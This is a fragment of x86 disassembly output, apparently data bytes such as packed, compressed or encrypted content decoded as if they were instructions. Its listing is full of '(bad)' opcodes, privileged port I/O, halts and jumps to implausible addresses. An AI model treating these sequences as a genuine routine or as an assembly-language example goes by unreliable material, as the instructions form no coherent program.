  402b62:	08 7c ca f6          	or     %bh,-0xa(%edx,%ecx,8)
  402b66:	03 e5                	add    %ebp,%esp
  402b68:	c5 17                	lds    (%edi),%edx
  402b6a:	dd 3e                	fnstsw (%esi)
  402b6c:	b4 51                	mov    $0x51,%ah
  402b6e:	e5 d4                	in     $0xd4,%eax
  402b70:	0b 8f cb 7c 22 24    	or     0x24227ccb(%edi),%ecx
  402b76:	bf f3 fa f9 82       	mov    $0x82f9faf3,%edi
  402b7b:	40                   	inc    %eax
  402b7c:	0b 5c 3f 46          	or     0x46(%edi,%edi,1),%ebx
  402b80:	e6 f3                	out    %al,$0xf3
  402b82:	b5 26                	mov    $0x26,%ch
  402b84:	f4                   	hlt
  402b85:	e6 f5                	out    %al,$0xf5
  402b87:	96                   	xchg   %eax,%esi
  402b88:	47                   	inc    %edi
  402b89:	01 9f 1a 13 fc ae    	add    %ebx,-0x5103ece6(%edi)
  402b8f:	13 fe                	adc    %esi,%edi
  402b91:	24 82                	and    $0x82,%al
  402b93:	1b ca                	sbb    %edx,%ecx
  402b95:	24 09                	and    $0x9,%al
  402b97:	66 d1 7a 38          	sarw   $1,0x38(%edx)
  402b9b:	ca 41 dc             	lret   $0xdc41
  402b9e:	ef                   	out    %eax,(%dx)
  402b9f:	b1 d5                	mov    $0xd5,%cl
  402ba1:	f9                   	stc
  402ba2:	7c 81                	jl     0x402b25
  402ba4:	82 e0 40             	and    $0x40,%al
  402ba7:	dd d9                	fstp   %st(1)
  402ba9:	15 b8 89 1a 11       	adc    $0x111a89b8,%eax
  402bae:	3d 2a 71 49 79       	cmp    $0x7949712a,%eax
  402bb3:	45                   	inc    %ebp
  402bb4:	3d 55 54 39 33       	cmp    $0x33395455,%eax
  402bb9:	fe                   	(bad)
  402bba:	6f                   	outsl  %ds:(%esi),(%dx)
  402bbb:	ed                   	in     (%dx),%eax
  402bbc:	b9 a1 d1 85 df       	mov    $0xdf85d1a1,%ecx
  402bc1:	64 7d f0             	fs jge 0x402bb4
  402bc4:	c1 2a 97             	shrl   $0x97,(%edx)
  402bc7:	ec                   	in     (%dx),%al
  402bc8:	5d                   	pop    %ebp
  402bc9:	d7                   	xlat   %ds:(%ebx)
  402bca:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402bcb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402bcc:	52                   	push   %edx
  402bcd:	25 6a 51 13 4f       	and    $0x4f13516a,%eax
  402bd2:	ac                   	lods   %ds:(%esi),%al
  402bd3:	27                   	daa
  402bd4:	e2 4c                	loop   0x402c22
  402bd6:	c4 a7 e8 b5 ab 96    	les    -0x69544a18(%edi),%esp
  402bdc:	44                   	inc    %esp
  402bdd:	66 cb                	lretw
  402bdf:	91                   	xchg   %eax,%ecx
  402be0:	ef                   	out    %eax,(%dx)
  402be1:	21 38                	and    %edi,(%eax)
  402be3:	bb 99 10 a4 8b       	mov    $0x8ba41099,%ebx
  402be8:	ed                   	in     (%dx),%eax
  402be9:	2d 11 a7 4d 38       	sub    $0x384da711,%eax
  402bee:	f8                   	clc
  402bef:	67 8e 73 2d          	mov    0x2d(%bp,%di),%?
  402bf3:	db c7                	fcmovnb %st(7),%st
  402bf5:	62 17                	bound  %edx,(%edi)
  402bf7:	15 2c 2a 03 30       	adc    $0x30032a2c,%eax
  402bfc:	d2 c9                	ror    %cl,%cl
  402bfe:	86 bd f9 8c 38 2a    	xchg   %bh,0x2a388cf9(%ebp)
  402c04:	d8 48 0a             	fmuls  0xa(%eax)
  402c07:	22 19                	and    (%ecx),%bl
  402c09:	e3 60                	jecxz  0x402c6b
  402c0b:	e5 61                	in     $0x61,%eax
  402c0d:	65 38 8f 2c 7d c2 64 	cmp    %cl,%gs:0x64c27d2c(%edi)
  402c14:	fb                   	sti
  402c15:	74 64                	je     0x402c7b
  402c17:	ee                   	out    %al,(%dx)
  402c18:	10 d6                	adc    %dl,%dh
  402c1a:	46                   	inc    %esi
  402c1b:	a9 77 d9 7d 95       	test   $0x957dd977,%eax
  402c20:	28 8d d1 91 29 59    	sub    %cl,0x592991d1(%ebp)
  402c26:	67 17                	addr16 pop %ss
  402c28:	fb                   	sti
  402c29:	a9 33 9a 67 60       	test   $0x60679a33,%eax
  402c2e:	b3 a1                	mov    $0xa1,%bl
  402c30:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c31:	81 b0 89 9e 8b d2 52 	xorl   $0xa5504152,-0x2d746177(%eax)
  402c38:	41 50 a5 
  402c3b:	35 7a ef 23 9b       	xor    $0x9b23ef7a,%eax
  402c40:	6c                   	insb   (%dx),%es:(%edi)
  402c41:	b4 f3                	mov    $0xf3,%ah
  402c43:	67 f5                	addr16 cmc
  402c45:	72 d9                	jb     0x402c20
  402c47:	07                   	pop    %es
  402c48:	a3 14 0c 41 1a       	mov    %eax,0x1a410c14
  402c4d:	f3 f2 cc             	repz repnz int3
  402c50:	45                   	inc    %ebp
  402c51:	a1 7f bf 4c 0c       	mov    0xc4cbf7f,%eax
  402c56:	00 34 4b             	add    %dh,(%ebx,%ecx,2)
  402c59:	9e                   	sahf
  402c5a:	12 e2                	adc    %dl,%ah
  402c5c:	81 09 19 bc e9 8b    	orl    $0x8be9bc19,(%ecx)
  402c62:	0f 95 62 88          	setne  -0x78(%edx)
  402c66:	fe                   	(bad)
  402c67:	17                   	pop    %ss
  402c68:	80 b3 d6 4d 7d 77 91 	xorb   $0x91,0x777d4dd6(%ebx)
  402c6f:	0f bf a9 6b dc 9f ad 	movswl -0x52602395(%ecx),%ebp
  402c76:	8d 90 50 17 7f 73    	lea    0x737f1750(%eax),%edx
  402c7c:	93                   	xchg   %eax,%ebx
  402c7d:	1d ce dd ad fc       	sbb    $0xfcadddce,%eax
  402c82:	ae                   	scas   %es:(%edi),%al
  402c83:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c84:	04 88                	add    $0x88,%al
  402c86:	92                   	xchg   %eax,%edx
  402c87:	54                   	push   %esp
  402c88:	b4 1c                	mov    $0x1c,%ah
  402c8a:	bf 5b d1 0b f4       	mov    $0xf40bd15b,%edi
  402c8f:	2a 58 0a             	sub    0xa(%eax),%bl
  402c92:	fa                   	cli
  402c93:	eb 04                	jmp    0x402c99
  402c95:	0c d4                	or     $0xd4,%al
  402c97:	8c 9b 39 cf 3f 65    	mov    %ds,0x653fcf39(%ebx)
  402c9d:	ce                   	into
  402c9e:	2b c6                	sub    %esi,%eax
  402ca0:	5d                   	pop    %ebp
  402ca1:	ac                   	lods   %ds:(%esi),%al
  402ca2:	a8 c2                	test   $0xc2,%al
  402ca4:	7b b6                	jnp    0x402c5c
  402ca6:	af                   	scas   %es:(%edi),%eax
  402ca7:	7b 91                	jnp    0x402c3a
  402ca9:	fb                   	sti
  402caa:	50                   	push   %eax
  402cab:	2d 02 e5 69 66       	sub    $0x6669e502,%eax
  402cb0:	de f1                	fdivp  %st,%st(1)
  402cb2:	b9 a6 0e eb 6d       	mov    $0x6deb0ea6,%ecx
  402cb7:	e8 78 37 1a cf       	call   0xcf5a6434
  402cbc:	19 26                	sbb    %esp,(%esi)
  402cbe:	e1 41                	loope  0x402d01
  402cc0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402cc1:	1c 29                	sbb    $0x29,%al
  402cc3:	1e                   	push   %ds
  402cc4:	e2 4f                	loop   0x402d15
  402cc6:	5f                   	pop    %edi
  402cc7:	93                   	xchg   %eax,%ebx
  402cc8:	33 51 7b             	xor    0x7b(%ecx),%edx
  402ccb:	99                   	cltd
  402ccc:	ea 28 8f 9a 20 9f 03 	ljmp   $0x39f,$0x209a8f28
  402cd3:	11 2c c9             	adc    %ebp,(%ecx,%ecx,8)
  402cd6:	70 35                	jo     0x402d0d
  402cd8:	a3 ec 8b 7d 7e       	mov    %eax,0x7e7d8bec
  402cdd:	ed                   	in     (%dx),%eax
  402cde:	eb 12                	jmp    0x402cf2
  402ce0:	7e f4                	jle    0x402cd6
  402ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce3:	04 fe                	add    $0xfe,%al
  402ce5:	67 30 99 b6 1a       	xor    %bl,0x1ab6(%bx,%di)
  402cea:	dd 20                	frstor (%eax)
  402cec:	7a 35                	jp     0x402d23
  402cee:	32 59 08             	xor    0x8(%ecx),%bl
  402cf1:	e6 64                	out    %al,$0x64
  402cf3:	e3 0d                	jecxz  0x402d02
  402cf5:	13 29                	adc    (%ecx),%ebp
  402cf7:	26 82 6f dd 0c       	subb   $0xc,%es:-0x23(%edi)
  402cfc:	dc 4c 9c 7f          	fmull  0x7f(%esp,%ebx,4)
  402d00:	c4 44 e4 4a          	les    0x4a(%esp,%eiz,8),%eax
  402d04:	d3 6f 1a             	shrl   %cl,0x1a(%edi)
  402d07:	d1 46 51             	roll   $1,0x51(%esi)
  402d0a:	2f                   	das
  402d0b:	d7                   	xlat   %ds:(%ebx)
  402d0c:	03 5b 25             	add    0x25(%ebx),%ebx
  402d0f:	c2 39 c7             	ret    $0xc739
  402d12:	b4 77                	mov    $0x77,%ah
  402d14:	2d f0 2b 73 9c       	sub    $0x9c732bf0,%eax
  402d19:	e0 66                	loopne 0x402d81
  402d1b:	c3                   	ret
  402d1c:	72 35                	jb     0x402d53
  402d1e:	d5 fa                	aad    $0xfa
  402d20:	4f                   	dec    %edi
  402d21:	e2 4a                	loop   0x402d6d
  402d23:	67 04 98             	addr16 add $0x98,%al
  402d26:	f4                   	hlt
  402d27:	c5 91 07 8b 5e 93    	lds    -0x6ca174f9(%ecx),%edx
  402d2d:	5d                   	pop    %ebp
  402d2e:	7c 97                	jl     0x402cc7
  402d30:	21 0e                	and    %ecx,(%esi)
  402d32:	46                   	inc    %esi
  402d33:	20 26                	and    %ah,(%esi)
  402d35:	3b e1                	cmp    %ecx,%esp
  402d37:	63 9b 97 ee 4a f5    	arpl   %ebx,-0xab51169(%ebx)
  402d3d:	74 2e                	je     0x402d6d
  402d3f:	bc dd 6c da 89       	mov    $0x89da6cdd,%esp
  402d44:	ec                   	in     (%dx),%al
  402d45:	97                   	xchg   %eax,%edi
  402d46:	3b 0e                	cmp    (%esi),%ecx
  402d48:	5f                   	pop    %edi
  402d49:	79 2b                	jns    0x402d76
  402d4b:	14 1c                	adc    $0x1c,%al
  402d4d:	83 95 fd 52 ef 69 b4 	adcl   $0xffffffb4,0x69ef52fd(%ebp)
  402d54:	46                   	inc    %esi
  402d55:	18 52 b0             	sbb    %dl,-0x50(%edx)
  402d58:	b5 08                	mov    $0x8,%ch
  402d5a:	11 00                	adc    %eax,(%eax)
  402d5c:	8b 5d 0e             	mov    0xe(%ebp),%ebx
  402d5f:	c7                   	(bad)
  402d60:	97                   	xchg   %eax,%edi
  402d61:	f5                   	cmc
  402d62:	1b a5 1d c0 9a 01    	sbb    0x19ac01d(%ebp),%esp
  402d68:	aa                   	stos   %al,%es:(%edi)
  402d69:	2f                   	das
  402d6a:	42                   	inc    %edx
  402d6b:	9e                   	sahf
  402d6c:	ac                   	lods   %ds:(%esi),%al
  402d6d:	85 2f                	test   %ebp,(%edi)
  402d6f:	d4 3a                	aam    $0x3a
  402d71:	36 34 5e             	ss xor $0x5e,%al
  402d74:	3f                   	aas
  402d75:	63 cf                	arpl   %ecx,%edi
  402d77:	a3 b4 bf 91 f8       	mov    %eax,0xf891bfb4
  402d7c:	0c 9d                	or     $0x9d,%al
  402d7e:	e9 f0 e0 37 94       	jmp    0x94780e73
  402d83:	c7 05 db fd 5a 70 81 	movl   $0x8f476581,0x705afddb
  402d8a:	65 47 8f 
  402d8d:	dc 0a                	fmull  (%edx)
  402d8f:	1b 5d 7b             	sbb    0x7b(%ebp),%ebx
  402d92:	64 f7 3e             	idivl  %fs:(%esi)
  402d95:	6b 8b ec d1 2e a8 37 	imul   $0x37,-0x57d12e14(%ebx),%ecx
  402d9c:	b5 8d                	mov    $0x8d,%ch
  402d9e:	e9 07 87 68 25       	jmp    0x25a8b4aa
  402da3:	b8 16 1c 2e 94       	mov    $0x942e1c16,%eax
  402da8:	2d 36 c5 b5 3a       	sub    $0x3ab5c536,%eax
  402dad:	52                   	push   %edx
  402dae:	15 6f 52 5e ef       	adc    $0xef5e526f,%eax
  402db3:	9f                   	lahf
  402db4:	5a                   	pop    %edx
  402db5:	1a f4                	sbb    %ah,%dh
  402db7:	e0 cd                	loopne 0x402d86
  402db9:	e7 48                	out    %eax,$0x48
  402dbb:	34 32                	xor    $0x32,%al
  402dbd:	9d                   	popf
  402dbe:	35 30 9b 3f 31       	xor    $0x313f9b30,%eax
  402dc3:	04 1e                	add    $0x1e,%al
  402dc5:	03 bd 9a 91 f1 b1    	add    -0x4e0e6e66(%ebp),%edi
  402dcb:	9a b8 66 a6 26 77 a3 	lcall  $0xa377,$0x26a666b8
  402dd2:	1f                   	pop    %ds
  402dd3:	31 55 8a             	xor    %edx,-0x76(%ebp)
  402dd6:	1e                   	push   %ds
  402dd7:	bb f5 4e 01 15       	mov    $0x15014ef5,%ebx
  402ddc:	c2 a4 ac             	ret    $0xaca4
  402ddf:	65 8e 9e 04 ff 75 64 	mov    %gs:0x6475ff04(%esi),%ds
  402de6:	6e                   	outsb  %ds:(%esi),(%dx)
  402de7:	c0 b6 da e1 cb 7e 85 	shlb   $0x85,0x7ecbe1da(%esi)
  402dee:	2f                   	das
  402def:	53                   	push   %ebx
  402df0:	bb 87 aa dd 68       	mov    $0x68ddaa87,%ebx
  402df5:	6a b1                	push   $0xffffffb1
  402df7:	1e                   	push   %ds
  402df8:	e6 05                	out    %al,$0x5
  402dfa:	6b 6d 4b c5          	imul   $0xffffffc5,0x4b(%ebp),%ebp
  402dfe:	fa                   	cli
  402dff:	7c b1                	jl     0x402db2
  402e01:	4f                   	dec    %edi
  402e02:	cc                   	int3
  402e03:	41                   	inc    %ecx
  402e04:	37                   	aaa
  402e05:	21 6b de             	and    %ebp,-0x22(%ebx)
  402e08:	d4 18                	aam    $0x18
  402e0a:	6d                   	insl   (%dx),%es:(%edi)
  402e0b:	d8 d5                	fcom   %st(5)
  402e0d:	8c 7f 3c             	mov    %?,0x3c(%edi)
  402e10:	81 cd cc 7f 6a a8    	or     $0xa86a7fcc,%ebp
  402e16:	80 d0 2f             	adc    $0x2f,%al
  402e19:	77 bc                	ja     0x402dd7
  402e1b:	58                   	pop    %eax
  402e1c:	ca c4 47             	lret   $0x47c4
  402e1f:	f2 91                	repnz xchg %eax,%ecx
  402e21:	4c                   	dec    %esp
  402e22:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402e23:	66 ae                	data16 scas %es:(%edi),%al
  402e25:	7b 6a                	jnp    0x402e91
  402e27:	2a 85 63 a5 e7 69    	sub    0x69e7a563(%ebp),%al
  402e2d:	52                   	push   %edx
  402e2e:	15 97 fe 8f 45       	adc    $0x458ffe97,%eax
  402e33:	91                   	xchg   %eax,%ecx
  402e34:	b9 28 54 be 01       	mov    $0x1be5428,%ecx
  402e39:	d2 d9                	rcr    %cl,%cl
  402e3b:	bc e9 ec b5 ba       	mov    $0xbab5ece9,%esp
  402e40:	d1 7a f9             	sarl   $1,-0x7(%edx)
  402e43:	7e 50                	jle    0x402e95
  402e45:	49                   	dec    %ecx
  402e46:	22 1e                	and    (%esi),%bl
  402e48:	e4 56                	in     $0x56,%al
  402e4a:	d6                   	salc
  402e4b:	0a ef                	or     %bh,%ch
  402e4d:	b4 3a                	mov    $0x3a,%ah
  402e4f:	61                   	popa
  402e50:	b2 d4                	mov    $0xd4,%dl
  402e52:	87 bd 89 c1 33 2e    	xchg   %edi,0x2e33c189(%ebp)
  402e58:	1b 95 56 5e b9 cc    	sbb    -0x3346a1aa(%ebp),%edx
  402e5e:	2f                   	das
  402e5f:	2a c9                	sub    %cl,%cl
  402e61:	83 00 9c             	addl   $0xffffff9c,(%eax)
  402e64:	72 5d                	jb     0x402ec3
  402e66:	da 97 98 93 4e 2d    	ficoml 0x2d4e9398(%edi)
  402e6c:	a2 b5 59 bf f3       	mov    %al,0xf3bf59b5
  402e71:	9d                   	popf
  402e72:	2b c9                	sub    %ecx,%ecx
  402e74:	f2 79 22             	bnd jns 0x402e99
  402e77:	9c                   	pushf
  402e78:	fd                   	std
  402e79:	df b2 c2 9f eb 8e    	fbstp  -0x7114603e(%edx)
  402e7f:	07                   	pop    %es
  402e80:	f8                   	clc
  402e81:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402e82:	4a                   	dec    %edx
  402e83:	a9 68 71 dd 40       	test   $0x40dd7168,%eax
  402e88:	dd b1 05 8f 8c e5    	fnsave -0x1a7370fb(%ecx)
  402e8e:	7e 60                	jle    0x402ef0
  402e90:	34 03                	xor    $0x3,%al
  402e92:	53                   	push   %ebx
  402e93:	fd                   	std
  402e94:	07                   	pop    %es
  402e95:	e8 ee 6b 2f b6       	call   0xb66f9a88
  402e9a:	00 94 f2 f5 6d 72 36 	add    %dl,0x36726df5(%edx,%esi,8)
  402ea1:	f1                   	int1
  402ea2:	9b                   	fwait
  402ea3:	b7 1d                	mov    $0x1d,%bh
  402ea5:	de 55 b4             	ficoms -0x4c(%ebp)
  402ea8:	89 cb                	mov    %ecx,%ebx
  402eaa:	f7 94 44 cf 15 03 19 	notl   0x190315cf(%esp,%eax,2)
  402eb1:	c7                   	(bad)
  402eb2:	e6 06                	out    %al,$0x6
  402eb4:	10 82 71 70 bd f8    	adc    %al,-0x7428f8f(%edx)
  402eba:	56                   	push   %esi
  402ebb:	5e                   	pop    %esi
  402ebc:	46                   	inc    %esi
  402ebd:	ec                   	in     (%dx),%al
  402ebe:	b5 43                	mov    $0x43,%ch
  402ec0:	07                   	pop    %es
  402ec1:	fd                   	std
  402ec2:	0d c7 96 12 94       	or     $0x941296c7,%eax
  402ec7:	26 d3 f2             	es shl %cl,%edx
  402eca:	c6                   	(bad)
  402ecb:	ec                   	in     (%dx),%al
  402ecc:	d6                   	salc
  402ecd:	d8 80 ba 68 0d 1f    	fadds  0x1f0d68ba(%eax)
  402ed3:	33 00                	xor    (%eax),%eax
  402ed5:	08 de                	or     %bl,%dh
  402ed7:	15 48 84 da e9       	adc    $0xe9da8448,%eax
  402edc:	36 e0 d6             	ss loopne 0x402eb5
  402edf:	4f                   	dec    %edi
  402ee0:	5e                   	pop    %esi
  402ee1:	11 77 01             	adc    %esi,0x1(%edi)
  402ee4:	cc                   	int3
  402ee5:	42                   	inc    %edx
  402ee6:	8f a8 82 57          	(bad)
  402eea:	a8 4f                	test   $0x4f,%al
  402eec:	af                   	scas   %es:(%edi),%eax
  402eed:	96                   	xchg   %eax,%esi
  402eee:	e8 6a cc 10 5e       	call   0x5e50fb5d
  402ef3:	42                   	inc    %edx
  402ef4:	30 84 24 8e 1f 49 0d 	xor    %al,0xd491f8e(%esp)
  402efb:	62 7a 3f             	bound  %edi,0x3f(%edx)
  402efe:	77 a1                	ja     0x402ea1
  402f00:	8a ed                	mov    %ch,%ch
  402f02:	d0 bf 8a 1c 77 76    	sarb   $1,0x76771c8a(%edi)
  402f08:	12 e5                	adc    %ch,%ah
  402f0a:	7d 54                	jge    0x402f60
  402f0c:	ee                   	out    %al,(%dx)
  402f0d:	00 3c fc             	add    %bh,(%esp,%edi,8)
  402f10:	83 a4 a4 71 19 30 9d 	andl   $0x51,-0x62cfe68f(%esp,%eiz,4)
  402f17:	51 
  402f18:	76 f4                	jbe    0x402f0e
  402f1a:	04 39                	add    $0x39,%al
  402f1c:	2d 68 ec 8c 77       	sub    $0x778cec68,%eax
  402f21:	39 36                	cmp    %esi,(%esi)
  402f23:	3d fd 32 db f9       	cmp    $0xf9db32fd,%eax
  402f28:	8b 1d 03 f3 c9 be    	mov    0xbec9f303,%ebx
  402f2e:	a3 ac e7 21 41       	mov    %eax,0x4121e7ac
  402f33:	11 56 b4             	adc    %edx,-0x4c(%esi)
  402f36:	bd ab 2b 75 b6       	mov    $0xb6752bab,%ebp
  402f3b:	9e                   	sahf
  402f3c:	93                   	xchg   %eax,%ebx
  402f3d:	67 36 dd b9 4d 1d    	fnstsw %ss:0x1d4d(%bx,%di)
  402f43:	83 a2 44 32 b0 29 16 	andl   $0x16,0x29b03244(%edx)
  402f4a:	61                   	popa
  402f4b:	03 19                	add    (%ecx),%ebx
  402f4d:	4b                   	dec    %ebx
  402f4e:	97                   	xchg   %eax,%edi
  402f4f:	47                   	inc    %edi
  402f50:	9d                   	popf
  402f51:	cc                   	int3
  402f52:	5f                   	pop    %edi
  402f53:	ab                   	stos   %eax,%es:(%edi)
  402f54:	30 44 00 1e          	xor    %al,0x1e(%eax,%eax,1)
  402f58:	90                   	nop
  402f59:	0c a2                	or     $0xa2,%al
  402f5b:	16                   	push   %ss
  402f5c:	38 91 a7 ca 94 63    	cmp    %dl,0x6394caa7(%ecx)
  402f62:	ec                   	in     (%dx),%al
  402f63:	22 87 44 8e 55 c4    	and    -0x3baa71bc(%edi),%al
  402f69:	56                   	push   %esi
  402f6a:	bb 21 ea c6 85       	mov    $0x85c6ea21,%ebx
  402f6f:	c3                   	ret
  402f70:	a0 09 a6 6e c2       	mov    0xc26ea609,%al
  402f75:	57                   	push   %edi
  402f76:	69 b8 25 a5 ee 21 53 	imul   $0x1d97053,0x21eea525(%eax),%edi
  402f7d:	70 d9 01 
  402f80:	d2 75 d2             	shlb   %cl,-0x2e(%ebp)
  402f83:	be ba 6c ed e9       	mov    $0xe9ed6cba,%esi
  402f88:	40                   	inc    %eax
  402f89:	24 44                	and    $0x44,%al
  402f8b:	49                   	dec    %ecx
  402f8c:	5d                   	pop    %ebp
  402f8d:	6f                   	outsl  %ds:(%esi),(%dx)
  402f8e:	52                   	push   %edx
  402f8f:	85 bc dc 07 e9 49 66 	test   %edi,0x6649e907(%esp,%ebx,8)
  402f96:	1e                   	push   %ds
  402f97:	5a                   	pop    %edx
  402f98:	a9 34 46 5f 40       	test   $0x405f4634,%eax
  402f9d:	b1 42                	mov    $0x42,%cl
  402f9f:	94                   	xchg   %eax,%esp
  402fa0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402fa1:	03 7c 3a 80          	add    -0x80(%edx,%edi,1),%edi
  402fa5:	20 c9                	and    %cl,%cl
  402fa7:	da 04 1f             	fiaddl (%edi,%ebx,1)
  402faa:	4e                   	dec    %esi
  402fab:	31 fe                	xor    %edi,%esi
  402fad:	10 bf 03 99 ce 9e    	adc    %bh,-0x613166fd(%edi)
  402fb3:	53                   	push   %ebx
  402fb4:	e4 20                	in     $0x20,%al
  402fb6:	3c 94                	cmp    $0x94,%al
  402fb8:	2e cd b8             	cs int $0xb8
  402fbb:	57                   	push   %edi
  402fbc:	4c                   	dec    %esp
  402fbd:	e5 96                	in     $0x96,%eax
  402fbf:	55                   	push   %ebp
  402fc0:	8f c7                	pop    %edi
  402fc2:	ad                   	lods   %ds:(%esi),%eax
  402fc3:	00 2b                	add    %ch,(%ebx)
  402fc5:	4a                   	dec    %edx
  402fc6:	52                   	push   %edx
  402fc7:	46                   	inc    %esi
  402fc8:	61                   	popa
  402fc9:	1c 02                	sbb    $0x2,%al
  402fcb:	79 89                	jns    0x402f56
  402fcd:	95                   	xchg   %eax,%ebp
  402fce:	2d 0c f8 b4 f2       	sub    $0xf2b4f80c,%eax
  402fd3:	7c 42                	jl     0x403017
  402fd5:	19 33                	sbb    %esi,(%ebx)
  402fd7:	6b 22 3d             	imul   $0x3d,(%edx),%esp
  402fda:	11 9d 48 d1 dd fb    	adc    %ebx,-0x4222eb8(%ebp)
  402fe0:	8e d4                	mov    %esp,%ss
  402fe2:	38 22                	cmp    %ah,(%edx)
  402fe4:	b9 ed d6 5f 9d       	mov    $0x9d5fd6ed,%ecx
  402fe9:	26 31 41 ea          	xor    %eax,%es:-0x16(%ecx)
  402fed:	c6 85 50 b5 dc 59 91 	movb   $0x91,0x59dcb550(%ebp)
  402ff4:	ee                   	out    %al,(%dx)
  402ff5:	78 ff                	js     0x402ff6
  402ff7:	d1 b0 f7 73 95 61    	shll   $1,0x619573f7(%eax)
  402ffd:	0d 52 82 80 f7       	or     $0xf7808252,%eax
  403002:	68 3e 4e 5a 14       	push   $0x145a4e3e
  403007:	84 7a 4e             	test   %bh,0x4e(%edx)
  40300a:	d2 ac a2 bd e2 70 c9 	shrb   %cl,-0x368f1d43(%edx,%eiz,4)
  403011:	df ad ba 7b 8c 11    	fildll 0x118c7bba(%ebp)
  403017:	28 4f 45             	sub    %cl,0x45(%edi)
  40301a:	c8 5a 3a ba          	enter  $0x3a5a,$0xba
  40301e:	f9                   	stc
  40301f:	1c b4                	sbb    $0xb4,%al
  403021:	f4                   	hlt
  403022:	ec                   	in     (%dx),%al
  403023:	4c                   	dec    %esp
  403024:	8c 50 81             	mov    %ss,-0x7f(%eax)
  403027:	9d                   	popf
  403028:	b6 4e                	mov    $0x4e,%dh
  40302a:	e9 7e 03 ef 07       	jmp    0x82f33ad
  40302f:	8e ce                	mov    %esi,%cs
  403031:	04 2e                	add    $0x2e,%al
  403033:	cf                   	iret
  403034:	07                   	pop    %es
  403035:	a1 ab 0d c9 1f       	mov    0x1fc90dab,%eax
  40303a:	2e d2 7a 35          	sarb   %cl,%cs:0x35(%edx)
  40303e:	2e c0 99 1f bf 7c 67 	rcrb   $0x82,%cs:0x677cbf1f(%ecx)
  403045:	82 
  403046:	51                   	push   %ecx
  403047:	3e 6c                	ds insb (%dx),%es:(%edi)
  403049:	89 cb                	mov    %ecx,%ebx
  40304b:	e8 bb e5 b6 ac       	call   0xacf7160b
  403050:	e2 07                	loop   0x403059
  403052:	d0 f8                	sar    $1,%al
  403054:	94                   	xchg   %eax,%esp
  403055:	b4 45                	mov    $0x45,%ah
  403057:	65 68 6d 5c 98 53    	gs push $0x53985c6d
  40305d:	e2 35                	loop   0x403094
  40305f:	5b                   	pop    %ebx
  403060:	cd 1c                	int    $0x1c
  403062:	1a 8b a5 78 7c da    	sbb    -0x2583875b(%ebx),%cl
  403068:	cf                   	iret
  403069:	76 fa                	jbe    0x403065
  40306b:	be 1c 17 35 ca       	mov    $0xca35171c,%esi
  403070:	e7 2c                	out    %eax,$0x2c
  403072:	9f                   	lahf
  403073:	0e                   	push   %cs
  403074:	20 c9                	and    %cl,%cl
  403076:	5e                   	pop    %esi
  403077:	3a e0                	cmp    %al,%ah
  403079:	47                   	inc    %edi
  40307a:	e9 09 8b 73 e1       	jmp    0xe1b3bb88
  40307f:	dd 80 c8 6e 3c a5    	fldl   -0x5ac39138(%eax)
  403085:	81 0a 5c 7e 3a 44    	orl    $0x443a7e5c,(%edx)
  40308b:	cd f1                	int    $0xf1
  40308d:	2b 63 e2             	sub    -0x1e(%ebx),%esp
  403090:	db ef                	fucomi %st(7),%st
  403092:	68 d1 8f 86 61       	push   $0x61868fd1
  403097:	88 01                	mov    %al,(%ecx)
  403099:	97                   	xchg   %eax,%edi
  40309a:	08 c8                	or     %cl,%al
  40309c:	08 00                	or     %al,(%eax)
  40309e:	e0 90                	loopne 0x403030
  4030a0:	c6                   	(bad)
  4030a1:	17                   	pop    %ss
  4030a2:	dc cb                	fmul   %st,%st(3)
  4030a4:	d9 fa                	fsqrt
  4030a6:	17                   	pop    %ss
  4030a7:	03 a3 2d 5c 9d 0d    	add    0xd9d5c2d(%ebx),%esp
  4030ad:	57                   	push   %edi
  4030ae:	0f f8 ff             	psubb  %mm7,%mm7
  4030b1:	52                   	push   %edx
  4030b2:	70 6c                	jo     0x403120
  4030b4:	75 59                	jne    0x40310f
  4030b6:	3b 2f                	cmp    (%edi),%ebp
  4030b8:	c1 33 5b             	shll   $0x5b,(%ebx)
  4030bb:	b8 5b e5 9d 1b       	mov    $0x1b9de55b,%eax
  4030c0:	99                   	cltd
  4030c1:	f4                   	hlt
  4030c2:	2b eb                	sub    %ebx,%ebp
  4030c4:	c0 a8 c5 99 93 60 e8 	shrb   $0xe8,0x609399c5(%eax)
  4030cb:	52                   	push   %edx
  4030cc:	9b                   	fwait
  4030cd:	4a                   	dec    %edx
  4030ce:	7c 40                	jl     0x403110
  4030d0:	8a 16                	mov    (%esi),%dl
  4030d2:	24 0f                	and    $0xf,%al
  4030d4:	ac                   	lods   %ds:(%esi),%al
  4030d5:	ac                   	lods   %ds:(%esi),%al
  4030d6:	04 9e                	add    $0x9e,%al
  4030d8:	8b a0 d3 67 41 56    	mov    0x564167d3(%eax),%esp
  4030de:	9a ce df 3b 95 10 aa 	lcall  $0xaa10,$0x953bdfce
  4030e5:	b3 cc                	mov    $0xcc,%bl
  4030e7:	58                   	pop    %eax
  4030e8:	de 35 04 df 37 77    	fidivs 0x7737df04
  4030ee:	ea af 87 58 bd f0 ae 	ljmp   $0xaef0,$0xbd5887af
  4030f5:	d5 13                	aad    $0x13
  4030f7:	67 45                	addr16 inc %ebp
  4030f9:	3a 2e                	cmp    (%esi),%ch
  4030fb:	ec                   	in     (%dx),%al
  4030fc:	8b f2                	mov    %edx,%esi
  4030fe:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4030ff:	4b                   	dec    %ebx
  403100:	b3 e2                	mov    $0xe2,%bl
  403102:	f2 29 d9             	repnz sub %ebx,%ecx
  403105:	d0 9b f7 00 9e ae    	rcrb   $1,-0x5161ff09(%ebx)
  40310b:	d4 8c                	aam    $0x8c
  40310d:	7a c8                	jp     0x4030d7
  40310f:	81 5c 3c ff b3 3a 2b 	sbbl   $0x802b3ab3,-0x1(%esp,%edi,1)
  403116:	80 
  403117:	84 bc aa 9e a5 4b 76 	test   %bh,0x764ba59e(%edx,%ebp,4)
  40311e:	75 5f                	jne    0x40317f
  403120:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403121:	86 53 14             	xchg   %dl,0x14(%ebx)
  403124:	e3 68                	jecxz  0x40318e
  403126:	4c                   	dec    %esp
